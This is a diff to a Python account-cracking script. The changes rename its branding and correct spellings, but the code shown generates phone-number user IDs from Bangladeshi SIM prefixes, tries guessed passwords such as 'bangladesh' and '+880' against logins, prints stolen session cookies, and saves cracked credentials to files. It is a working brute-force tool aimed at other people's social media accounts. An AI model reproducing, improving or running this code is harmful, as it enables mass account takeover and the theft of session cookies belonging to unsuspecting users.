@@ -1368,7 +1368,7 @@ def bd():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[•] EXAMPLE : 017***,016***,019****,018****,.ETC')
+	print('[•] EXAMPLE : 017,016,019,018,.')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
@@ -1390,7 +1390,7 @@ def bd():
 		lines()
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,'+88','bangladish']
+			pwx = [guru,'+880','bangladesh']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -1424,7 +1424,7 @@ def chos():
     HamiiID = []
     os.system('clear')
     print(logo)
-    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
+    print('[•] EXAMPLE : khan12345,bangladesh,baloch,Etc')
     lines()
     for bilal in range(passx):
         pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
@@ -1500,21 +1500,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[ABKHANX-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('ABKHANX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[KHAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                open('KHAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[ABKHANX-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('ABKHANX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                # print('\033[1;33m[KHAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('KHAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mABKHANX\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mKHAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
